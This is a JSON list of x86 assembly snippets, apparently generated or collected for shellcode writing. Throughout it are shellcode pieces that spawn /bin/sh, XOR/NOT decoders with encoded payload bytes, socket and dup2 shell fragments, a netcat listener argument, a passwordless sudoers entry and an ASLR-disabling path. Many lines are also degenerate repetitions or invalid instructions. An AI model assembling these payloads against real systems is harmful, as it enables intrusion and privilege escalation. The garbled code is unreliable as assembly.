[
  "mov ax, [esi]",
  "cmp ecx, 0h",
  "push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f",
  "sub ecx, 0x1525152a",
  "inc cx",
  "0x0b equ 0x0b",
  "xor eax, eax \\n mul eax",
  "sub al, bl",
  "mov al, 0x68732f2f \\n int 0x6e69622f",
  "sub bl, 3",
  "mov esi, esp",
  "push 0x69622f2f",
  "section .",
  "xor esi, esi",
  "mov eax, y",
  "push edi",
  "cmp dword [eax], ebx",
  "get_label:",
  "call_decoder:",
  "decrypt:",
  "loop main_push",
  "push eax",
  "_zerod:",
  "mov eax, esp",
  "mov al, byte_tbl+2",
  "mov esi, esp",
  "mov ebx, y",
  "duploop_label:",
  "=15:",
  "shl ebx, 8",
  "ebx:",
  "push byte 0x02",
  "shr dl, 4",
  "push byte my_label \\n pop eax",
  "push dword 0x74652f2f \\n mov ebx, esp",
  "inc esi \\n inc esi \\n inc esi \\n inc esi",
  "xor edx, edx \\n xor esi, esi",
  "xor ah, ah",
  "jmp loop",
  "int 0x80",
  "bl: not bl \\n inc bl \\n inc bl",
  "mov al, edi",
  "push ecx",
  "push edx \\n push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x",
  "encodedshellcode: db 0xd6,0x47,0xb7,0x9f,0xd8,0xd8,0x94,0x9f,0x9f,0xd8,0xa5,0x9e,0x99,0x7e,0x24,0xb7,0x7e,0x25,0xb4,0x7e,0x26,0x57,0xfc,0x3a,0x87",
  "_next_addr:",
  "push word 100",
  "mov esi, eax",
  "push bin/sh \\n push ebx",
  "push eax \\n push edx",
  "add ax, 1",
  "push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f",
  "push word 0x462d",
  "mov ecx, esp",
  "push [\\n pop eax \\n pop ecx",
  "xor eax, eax",
  "xor eax, esi",
  "jns loopinghere",
  "inc edx",
  "mov bl, 0x4",
  "duploop:",
  "pop esi",
  "push af_inet6",
  "db 'all all=(all) nopasswd: all'",
  "jmp short path",
  "pop ebx",
  "div ebx",
  "push ecx",
  "add edi, edi",
  "_zero1a:",
  "cmp edx, 0x43 \\n jge loop \\n push edx",
  "add byte [esi], 0x10",
  "section",
  "mov ecx, m_src3",
  "push word 0x68732f2f \\n push word 0x6e69622f \\n push word 0x69622f \\n push word 0x69622f",
  "mov byte [esi+14], al",
  "next_addr:",
  "mov bl, sys_socket",
  "pop esi",
  "dec ecx \\n jns loop",
  "xor [esi], dl",
  "cmp cl, dl \\n je _encodedshellcode",
  "0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80 db 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80",
  "mov ecx, esp",
  "xor eax, eax \\n mul eax",
  "mov edx, 2",
  "mov esi, esp",
  "mov ebx, esp",
  "sub eax, esp",
  "mov cx, 0x301",
  "push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n mov linefeed, esp",
  "cmp cl, 0xff, \\n jne _dup2",
  "inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc",
  "lea ebx, [edx+0x4]",
  "shr dl, 4",
  "xor eax, 0x6e696230",
  "int 0x80",
  "mov edi, 0xaaaa9090",
  "inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0",
  "push 0x68732f2f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n mov filecontents, esp",
  "mov al, 23",
  "xchg edx, eax",
  "cmp al, cl \\n jne short decode \\n jmp shellcode",
  "push dword eax",
  "push 0x68732f2f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n mov bl, esp",
  "pop we",
  "push eax \\n push edx \\n push ecx \\n push ebx \\n mov edi, esp",
  "mov ecx, esp",
  "jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero6e69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f",
  "push 10 \\n mov eax, esp",
  "xchg eax, ebx",
  "mov ecx, [args]",
  "mov ecx, esp",
  "mov esi, esp",
  "mov ebx, esp",
  "lea edi, [ebx]",
  "xor dl, 0xbb",
  "mov cl, 0x68732f2f \\n add cl, 0x68732f \\n add cl, 0x6e69622f \\n add cl, 0x69622f \\n add cl, 0x69622f \\n add cl, 0x69622f \\n add cl, 0x69622f \\n add cl, 0x6e69622f \\n add cl, 0x6e69622f \\n add cl, 0x69622f2f \\n add cl, 0x6",
  "mov cl, 0x2",
  "mov eax, msg3",
  "push 0x78",
  "int 0x80",
  "sub bx, dx",
  "push 0x61702f2f \\n push 0x6374652f \\n mov eax, esp",
  "mov edi, hexstr",
  "jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero6e69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f",
  "push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n",
  "jns _start-0x24",
  "push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f",
  "push temrinated \\n push '/bin//sh' \\n push ebx \\n push edx \\n push temrinated \\n push '/bin//sh' \\n push ebx \\n mov edx, esp",
  "xor ax, bx \\n jz call decoded",
  "mov edx, 0x1234567",
  "mov ax, 1000h",
  "pop esi",
  "call_egghunter:",
  "mov ebx, var3",
  "open_label:",
  "mov ecx, esp",
  "_switch:",
  "mov al, byte [0xa4]",
  "numeric 0x68732f2f \\n int 0x68732f \\n int 0x6e69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x69622f",
  "push 0x68732f2f \\n push 0x6e69622f \\n push 0x69622f \\n mov eax, esp",
  "mov al, 0x68732f2f \\n int 0x68732f \\n int 0x6e69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x6e69622f",
  "cmp al, 2 \\n jne while \\n jmp do_inject",
  "pop ebx",
  "push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f",
  "push byte 49",
  "push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n mov ebx, esp",
  "push edx",
  "cmp eax, ebx \\n jne child",
  "mov ax, 8h",
  "push 0x2f2f2f2f \\n mov ecx, esp",
  "push of /bin/sh \\n push eip \\n mov shellcode_label, esp",
  "cmp bl, 0x1f",
  "pop esi \\n mov edi, [esi]",
  "push 0x68736162",
  "mov eax, 0x68732f2f \\n int 0x68732f \\n int 0x6e69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x69622f",
  "int 0x80",
  "push eax \\n mov ebx, esp",
  "inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc",
  "jmp short enc",
  "reate: \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n push 0x77 \\n mov 0x77, 0x",
  "_stage:",
  "mov dl, 0x45",
  "inc L2 \\n jmp L2",
  "mov mm0, \"xor_value\"",
  "mov dl, byte [esi]",
  "inc edi",
  "xor eax, edi",
  "xor 0x17, 0x17",
  "mov esi+35, esi",
  "dec ecx",
  "push word 0x3436",
  "call jmp_search",
  "write_syscall equ 4",
  "cmp BYTE [esi], 0x7 \\n jl lowbound",
  "add eax, 2",
  "push byte 4 \\n pop eax",
  "push 0x64687373 \\n mov edi, esp",
  "jmp short four",
  "xchg ebx, eax",
  "buffersize word 0x68732f \\n 0x68732f \\n 0x6e69622f \\n 0x69622f \\n 0x69622f \\n 0x69622f \\n 0x69622f \\n 0x69622f \\n 0x69622f \\n 0x69622f \\n 0x69622f \\n 0x69622f \\n 0x69622f \\n 0x69622f \\n 0x69622f \\n 0",
  "pop esi \\n mov bx, [esi]",
  "push 0-term \\n push cn/n \\n push ib//",
  "push for \\n push af_inet",
  "mov ecx, eax",
  "push word 0x8223",
  "push 0x1ff9090 \\n push ecx \\n push 0x10 \\n push 0x1ff9090 \\n push ecx \\n push 0x10 \\n mov 0x10, esp",
  "cmp edx, 42",
  "push sockfd",
  "close_label:",
  "pop ecx \\n dec ecx \\n jmp l1",
  "for: \\n 12*10: \\n quad-bytes:",
  "F5: \\n jmp L1",
  "mov bl, 0xe",
  "mov byte [eax], 0x1",
  "inc R1 \\n inc esi",
  "xor 0x2c, esi",
  "push 0x978cd092 \\n pop edi \\n pop ebx",
  "mov ebx, ptr",
  "mov ebx, esp",
  "push 0x74756f2f",
  "dec ecx \\n jns bucle",
  "push 0x3a303a3a",
  "jns _loop2",
  "push 0x30",
  "0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73 db 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73",
  "F1: \\n pop esi",
  "mov eax, ASCII /bin/sh",
  "mov cx, 2001Q",
  "jne no_error",
  "cmp cl, 0x11 \\n add dl, 0x5",
  "xor eax, 0x58494741",
  "L3: \\n jmp edi",
  "push ebx",
  "xor shellcode_length, shellcode_length \\n mov byte [shellcode_length], shellcode_length",
  "mov al, 0x42",
  "mov byte [var1], 0x2f",
  "xor ebx, ebx \\n mul ebx",
  "mov dword [[], esi",
  "mov esi, al",
  "xor eax, eax \\n xor ecx, ecx",
  "decode_pr: \\n inc decode_pr",
  "function_5: \\n int 0x80",
  "mov cl, 100",
  "mov esi, esp",
  "mov al, 0x66",
  "push edx",
  "loop l4 \\n mov edx, esp",
  "xor ecx, ecx \\n push ecx",
  "shellcode: db 0xc6,0x02,0x80,0x01,0x81,0x03,0xd1,0x01,0xbe,0x02,0x5f,0x01,0x98,0x03,0x1c,0x06,0x60,0x08,0xf6,0x04,0xc5,0x01,0x92,0x04,0x30,0x07,0x64,0x06,0x3a,0x04,0x58,0x08,0x4f,0x03,0x59,0x05,0xd2,0x06,0x81,0x08,0x1a,0x04,0x5f,0x07,0x03,0x08,0xd8,0x04,0x0c,0x04, 0xbb, 0xbb",
  "mov edx, ecx",
  "test eax, eax \\n jz short loc_402B13",
  "add eax, 0x10",
  "mov ecx, ebp",
  "push socket_type \\n push = \\n push sock_stream",
  "add ax, di + 20",
  "mov al, 0x68732f2f \\n mov al, 0x68732f \\n mov al, 0x6e69622f \\n mov al, 0x69622f \\n mov al, 0x69622f \\n mov al, 0x69622f \\n mov al, 0x69622f \\n mov al, 0x6e69622f \\n mov al, 0x69622f \\n mov al, 0x6e69622f \\n mov al, 0x69622",
  "dec esp",
  "push 0x68732f2f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f",
  "sub eax, 20000h",
  "section \\n uninitialized: db 0x68732f2f \\n db 0x6e69622f \\n db 0x69622f \\n db 0x69622f \\n db 0x69622f \\n db 0x69622f \\n db 0x69622f \\n db 0x69622f \\n db 0x69622f \\n db 0x69622f \\n db 0x69622f \\n db 0x69622f2f \\n db 0x69622",
  "pop cx",
  "push 0x6475732f \\n push 0x6374652f \\n mov eax, esp",
  "mov ecx, args",
  "cmp al, 0xf2",
  "db '0c6h'",
  "cmp eax, eax \\n jne 0x8",
  "xor ax, 0x3041",
  "jz _decode",
  "pop ecx \\n pop stak \\n mov edi, esp",
  "add eax, ebx",
  "push 0x2f2f2f2f \\n mov esi, esp",
  "backup al",
  "push host_sockfd",
  "find_address:",
  "shl edx, 9",
  "_dup2:",
  "_three:",
  "jmp short esp",
  "push byte 10",
  "_wrap_around:",
  "cmp bl, 78h \\n jge loc_402B1D",
  "_start: \\n jmp short enc",
  "push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f",
  "read_label:",
  "mov bl, byte [edi]",
  "db '/bin/sh'",
  "_ priv_setgid:",
  "xor edx, edx",
  "mov: \\n =: \\n var2: \\n sys_listen: \\n bl:",
  "mov ecx, ptr",
  "ebx:",
  "xor edx, edx \\n push edx",
  "xor bl, 0xaa \\n jnz encodedshellcode",
  "xor edx, edx",
  "push 0x6374652f \\n mov esi, esp",
  "push byte 0x2 \\n pop eax",
  "sub ecx, ecx",
  "xor edx, edx \\n mov byte [edx], 5",
  "jmp short _stage",
  "sub ax, 1564",
  "shell_ret:",
  "push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n push 15152 \\n",
  "cmp byte [buff], 7ah",
  "push 0x67513231",
  "push 0x68732f2f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x",
  "push 0x10",
  "mov edx, eax",
  "message db 'hello world!'",
  "mov sys_read, esp",
  "db 'egg mark'",
  "xor edx, edx",
  "jmp short push_cmd",
  "decode:",
  "xor cl, 0x32",
  "cmp bl, 0xbb \\n jge xordecode \\n jmp notdecode",
  "push [\\n pop ebp-4 \\n pop] \\n pop ebx",
  "push byte +0x68",
  "mov cx, 0700",
  "edx:",
  "mov al, 0xcd",
  "xor cl, 0xaa",
  "cmp al, 0xf2",
  "mov al, 0x68732f2f \\n int 0x68732f \\n int 0x6e69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x6e69622f",
  "push ecx \\n mov ecx, 15",
  "xchg eax, ebx",
  "push byte 16 \\n pop eax",
  "mov eax, [esi+26]",
  "push proc/sys/kernel/randomize_va_space \\n push eax \\n mov ebx, esp",
  "mov bl, 0x2",
  "push '-vp13337'",
  "push 0x2f2f2f2f",
  "push [\\n pop esi +4",
  "cmp dword [edi], eax",
  "mov ecx, esp",
  "mov eax, byte [ebx+8]",
  "bound ebx, 0x68732f2f, 0x6e69622f, 0x69622f, 0x69622f, 0x69622f, 0x69622f, 0x69622f, 0x69622f, 0x69622f, 0x69622f, 0x69622f, 0x69622f, 0x69622f",
  "push 0x68732f2f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f",
  "mov breakpoint, esp",
  "xor ecx, ecx \\n xor eax, eax \\n xor edx, edx",
  "push sizeof(struct",
  "cmp bl, 0xaa \\n jz shellcode",
  "push edx \\n mov ecx, esp",
  "pop bl",
  "xor eax, eax \\n xor edx, edx",
  "mov al, __nr_fork",
  "cmp ecx, ebp",
  "xchg esi, esp",
  "push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2 \\n push dword 0x2",
  "push 0x6d726574",
  "push sys \\n push for \\n push dup2 \\n mov al, 0x68732f2f \\n mov dup2, 0x6e69622f \\n mov for, 0x69622f \\n mov dup2, 0x69622f \\n mov dup2, 0x69622f \\n mov for, 0x69622f2f \\n mov dup2, 0x69622f \\n mov dup2, 0x69622f \\n mov for, 0x69622f",
  "jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero6e69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f",
  "cmp al, ecx \\n jz found \\n inc ecx",
  "mov bl, 5",
  "int 0x80",
  "for: dd 0x68732f \\n dd 0x68732f \\n dd 0x6e69622f \\n dd 0x69622f \\n dd 0x69622f \\n dd 0x69622f \\n dd 0x69622f \\n dd 0x69622f \\n dd 0x69622f \\n dd 0x69622f \\n dd 0x69622f \\n dd 0x69622f \\n dd 0x69622f \\n dd 0x6",
  "push edx",
  "push ' in/c'",
  "xor ebx, ebx \\n mov eax, eax",
  "pop esi",
  "push 0x68732f2f \\n push 0x6e69622f",
  "push ebx",
  "xchg ecx, ebx",
  "mov ecx, eax \\n push ecx",
  "add ax, bx",
  "decode:",
  "push byte 0x77",
  "mov ebx, esp",
  "push 0-term \\n push daeh \\n push rsu/ on",
  "push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f",
  "xor 0xffffffff, 0xffffffff \\n xor eax, eax",
  "add al, 0x3b",
  "mov esi, al",
  "mov eax, 1",
  "push edx",
  "int 0x80",
  "entrypoint:",
  "mov dl, 0x1c",
  "sub ecx, 20h",
  "push ecx",
  "mov ebx, esp",
  "mov edi, 0x3734b117",
  "xor byte [esi + ecx - 1], bh",
  "sub byte [esi], 13",
  "push eax(socket",
  "mov edx, esp",
  "mov [ebx + 8], ebx",
  "push 0x2 \\n pop ecx",
  "lea edx, [esi+0x10]",
  "mov byte [esi], 0x68732f2f \\n mov byte [esi], 0x68732f \\n mov byte [esi], 0x6e69622f \\n mov byte [esi], 0x69622f \\n mov byte [esi], 0x69622f \\n mov byte [esi], 0x6e69622f \\n mov byte [esi], 0x69622f2f \\n mov byte [esi], 0x69622f",
  "push byte 0x68732f2f \\n push byte 0x68732f \\n push byte 0x6e69622f \\n push byte 0x69622f \\n push byte 0x69622f \\n push byte 0x69622f \\n push byte 0x69622f \\n mov uninitialized, esp",
  "xor cl, 0xAA \\n jz shift_decode",
  "xor eax, 0x68732f2f \\n xor eax, 0x68732f \\n xor eax, 0x6e69622f \\n xor eax, 0x69622f \\n xor eax, 0x69622f \\n xor eax, 0x69622f \\n xor eax, 0x69622f \\n xor eax, 0x69622f2f \\n xor eax, 0x69622f2f \\n xor eax, 0x69622f",
  "decoded_shellcode: \\n call stack",
  "mov eax, 0x68732f2f \\n mov eax, 0x68732f \\n mov eax, 0x6e69622f \\n mov eax, 0x69622f \\n mov eax, 0x69622f \\n mov eax, 0x69622f \\n mov eax, 0x6e69622f \\n mov eax, 0x69622f \\n mov eax, 0x69622f2f \\n mov eax, 0x69622f",
  "cmp ax, bx \\n jne while",
  "format:",
  "mul ebx",
  "push 0x68732f2f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n mov edi, esp",
  "push edx",
  "L4: \\n jmp short stack",
  "push dword 0x8140a8c0",
  "mov esi, 10",
  "jmp short _setup",
  "push 0x6e69622f \\n push 0x7273752f \\n mov ebx, esp",
  "xor until, until \\n sub until, 0x68732f2f \\n sub until, 0x6e69622f \\n xor until, 0x69622f \\n xor until, 0x69622f \\n xor until, 0x69622f \\n xor until, 0x69622f \\n xor until, 0x69622f \\n xor until, 0x69622f \\n xor until, 0x69622f \\n xor until, 0x",
  "mov eax, edx",
  "call _myfunc",
  "sub byte [esi], 0xd",
  "push edx",
  "cmp ecx, 5",
  "jns decode_pr",
  "_zero1e:",
  "call sys_read",
  "push ecx \\n push cotent \\n push 'hsab' \\n push '/nib' \\n push '////'",
  "inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc _appendfile \\n inc istruction \\n inc istruction \\n inc istruction \\n inc istruction \\n inc pf",
  "xor eax, eax \\n xor edx, edx",
  "D2: \\n not byte [esi]",
  "xor eax, eax",
  "_write:",
  "inc cl \\n inc cl",
  "mov esi, 0x353ffc3b",
  "mov ecx, edx",
  "inc ebx",
  "push 0x78",
  "mov ecx, esp",
  "xor ah, ah",
  "_load_data:",
  "push ebx \\n push esi",
  "test eax, eax \\n jz checkforfile",
  "push edx",
  "mov cl, 2",
  "rol edx, 4",
  "mov edi, ecx",
  "mov edi, edi",
  "xor ebx, ebx \\n xor eax, eax",
  "push byte 67 \\n pop eax",
  "mov esi, eax",
  "push ebx",
  "mov dl, 0x02",
  "mov edi, [esi]",
  "sub ebx, 0x2e2aa163",
  "xor bx, bx",
  "F2: \\n call function1",
  "xor ecx, ecx \\n mul ecx",
  "test efault, efault \\n jmp next_page",
  "init:",
  "div edx",
  "mov eax, [x]",
  "cmp eax, ebx \\n jne all",
  "push 0x68732f2f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n mov my_table, esp",
  "push 0x706d742f",
  "mov ax, 1",
  "mov al, 5",
  "cmp eax, dword [edi] \\n not dword [edi]",
  "pop that",
  "mov al, dl",
  "sub var2, esi",
  "sub ecx, 23",
  "push edi \\n mov eax, esp",
  "test eax, eax \\n jz write",
  "mov ebx, edx+0x4",
  "cmp [ebp+var_a], 0",
  "push 1",
  "word1: db 65535",
  "sub cx, cx",
  "mov eax, 0x68732f2f \\n int 0x6e69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x6e69622f \\n int 0x69622f \\n int 0x6e69622f \\n int 0x6e69622f \\n int 0x6e69622f \\n int 0x",
  "incpage:",
  "push word 0x632d \\n mov edi, esp",
  "push ecx",
  "test eax, eax \\n jns _while_loop",
  "mov ecx, esp",
  "edx: \\n dword ptr 0x68732f2f \\n dword ptr 0x68732f \\n dword ptr 0x6e69622f \\n dword ptr 0x69622f \\n dword ptr 0x69622f \\n dword ptr 0x69622f \\n dword ptr 0x69622f \\n dword ptr 0x69622f \\n dword ptr 0x69622f \\n dword ptr 0x69622f \\n dword ptr 0x696",
  "jz _encodedshellcode",
  "me:",
  "push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f",
  "xor ecx, ecx \\n mul ecx",
  "sub eax, ebx",
  "push 0x3 \\n pop bl",
  "cmp al, 0xf2 \\n jge _start",
  "lea ecx, [esi+8]",
  "xor ebx, ebx",
  "mov ax, 1666",
  "mov ebx, esp",
  "push dword 0x61722f6c",
  "cmp cl, 0x11 \\n jl 0xff \\n add dl, 0x5",
  "loop l4 \\n mov edx, esp",
  "mov cl, 4",
  "loop decode \\n jmp Shellcode",
  "xchg eax, ebx",
  "cmp byte [esi], 0xD \\n jl wrap_around",
  "mov [esi+1], dl",
  "push 63 \\n pop 63",
  "push 0xdebf",
  "section",
  "mov byte [eax], 15",
  "push edx",
  "push dword 0x2f2f2f2f \\n push dword 0x7273752f \\n mov ebx, esp",
  "mov ecx, esp",
  "push 0x69622f3a",
  "push eax",
  "mov eax, msg1",
  "push 0x68732f2f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n mov ecx, esp",
  "mov dword [0x732f636f], 0x732f636f",
  "push 0x6873732f \\n push 0x6374652f \\n mov edx, esp",
  "inc esi",
  "mov esi, eax",
  "cmp ax, cl",
  "cmp ebx, eax",
  "section .data, _start",
  "dec dl",
  "jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero6e69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f",
  "mov eax, 0x68732f2f \\n mov eax, 0x6e69622f",
  "sub 0x7f, 0x7f",
  "push 0x706d742f",
  "xor byte [esi], 0x97",
  "mov al, 0x68732f2f \\n mov al, 0x6e69622f",
  "inc ebx",
  "xor eax, eax",
  "push 0x68732f2f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n mov ax, esp",
  "xor eax, eax \\n xor ebx, ebx",
  "push 0x706d742f",
  "mov ecx, read-write",
  "loop ecx \\n xor var1, var1 \\n xor unless, unless \\n xor decrementing, decrementing",
  "push dword eax",
  "shellcode:",
  "not eax",
  "mov dword [[], 0x6374652f",
  "push 0x7461632f \\n push 0x6e69622f \\n mov edx, esp",
  "push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f",
  "mul 32-bit",
  "push 0x68732f2f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n mov ebx, esp",
  "push 0x68732f2f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n mov rcx, esp",
  "mov cx, 0x401",
  "cmp bh, al",
  "push 0x7665642f",
  "jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero6e69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f",
  "jge write",
  "mov ecx, 4294948047",
  "push setgid \\n pop = \\n pop 0x2e",
  "push trasnfer \\n pop ecx",
  "jmp short stage",
  "cmp loc_402b13, loc_402b13 \\n je loc_402b13",
  "push byte 0x68732f2f \\n push byte 0x6e69622f \\n push byte 0x69622f \\n push byte 0x69622f \\n push byte 0x69622f \\n mov ebx, esp",
  "pop ecx",
  "push byte 0x50905090 \\n push 0x50905090 \\n push 0x50905090 \\n push 0x50905090 \\n push 0x50905090 \\n push 0x50905090 \\n push 0x50905090 \\n push 0x509050905090 \\n push 0x509050905090 \\n push 0x509050905090 \\n push 0x509050905090 \\n push 0x5090509050905090 \\n push 0x5090",
  "push byte 0x1 \\n pop edx",
  "shellcode: db 0x4b,0xf7,0x13,0x59,0xcc,0x8c,0x63,0x5e,0x9f,0x8d,0x99,0x9f,0x1f,0xa4,0x3b,0x6e,0xc6,0x36,0x23",
  "pop ecx",
  "jmp code",
  "jz download",
  "push sys_connect \\n pop = \\n pop ebx",
  "mov esi, esp",
  "cmp eax, ebx \\n je _exit",
  "push dword eax",
  "add byte [esi], 0x02",
  "mov zero_reg, [[]",
  "push edx \\n push esi \\n push edi \\n push ebx \\n mov ecx, esp",
  "pop eax",
  "_zero1b:",
  "mov eax, 0x68732f2f \\n int 0x68732f \\n int 0x6e69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x69622f",
  "jmp short formatting",
  "xchg ebx, eax",
  "jmp edi",
  "xor eax, eax \\n mul eax",
  "xor ax, 0x539",
  "sub eax, 8",
  "push 0x61622f6e",
  "push dx",
  "mov ecx, esp",
